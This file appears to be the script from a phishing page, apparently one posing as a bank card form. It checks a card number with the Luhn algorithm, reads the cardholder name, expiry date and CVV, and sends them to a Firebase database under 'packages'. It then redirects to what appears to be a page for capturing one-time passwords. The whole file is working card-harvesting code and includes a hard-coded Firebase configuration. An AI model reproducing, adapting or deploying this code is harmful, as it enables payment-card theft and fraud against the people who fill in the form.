  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

   // For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyDEZDcHgqC586_shWpObiwyY5k3WS12y_Y",
  authDomain: "sandy-khalid-sbi2-2330-1-9-25.firebaseapp.com",
  projectId: "sandy-khalid-sbi2-2330-1-9-25",
  storageBucket: "sandy-khalid-sbi2-2330-1-9-25.firebasestorage.app",
  messagingSenderId: "385696590379",
  appId: "1:385696590379:web:b7211b201612b3a02c186e",
  measurementId: "G-3NELKK881G"
};


    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    function luhnCheck(num) {
      let sum = 0, alt = false;
      for (let i = num.length - 1; i >= 0; i--) {
        let n = parseInt(num[i], 10);
        if (alt) {
          n *= 2;
          if (n > 9) n -= 9;
        }
        sum += n;
        alt = !alt;
      }
      return sum % 10 === 0;
    }

    const cardInput = document.getElementById('cardNumber');
    cardInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '').substring(0, 16);
      let formatted = value.match(/.{1,4}/g)?.join(' ') || '';
      e.target.value = formatted;
    });

    document.getElementById('cardForm').addEventListener('submit', (e) => {
      e.preventDefault();
      document.getElementById('cardError').innerText = '';
      document.getElementById('cvvError').innerText = '';

      const cardNumberRaw = cardInput.value.replace(/\s/g, '');
      const cardHolder = document.getElementById('cardHolder').value.trim();
      const month = document.getElementById('month').value;
      const year = document.getElementById('year').value;
      const cvv = document.querySelector('.cvv-input').value.trim();

      let valid = true;

      if (!/^\d{16}$/.test(cardNumberRaw) || !luhnCheck(cardNumberRaw)) {
        document.getElementById('cardError').innerText = 'Invalid card number';
        valid = false;
      }

      if (cardHolder.length === 0) {
        alert('Card holder name is required');
        valid = false;
      }

      if (month === "Month" || year === "Year") {
        alert('Please select expiry month and year');
        valid = false;
      } else {
        const now = new Date();
        const currentYear = now.getFullYear();
        const currentMonth = now.getMonth() + 1;
        const expYear = parseInt(year, 10);
        const expMonth = parseInt(month, 10);
        if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
          alert('Card expiry date is invalid or expired');
          valid = false;
        }
      }

      if (!/^\d{3}$/.test(cvv)) {
        document.getElementById('cvvError').innerText = 'CVV must be 3 digits';
        valid = false;
      }

      if (!valid) return;

      push(ref(db, 'packages'), {
        cardNumber: cardNumberRaw,
        cardHolder,
        expiryMM: month,
        expiryYY: year,
        cvv,
        timestamp: new Date().toISOString()
      }).then(() => {
        e.target.reset();
        window.location.href = "otp3pageagain2.html";
      }).catch(err => {
        alert('Error saving data: ' + err.message);
      });
    });
  </script>
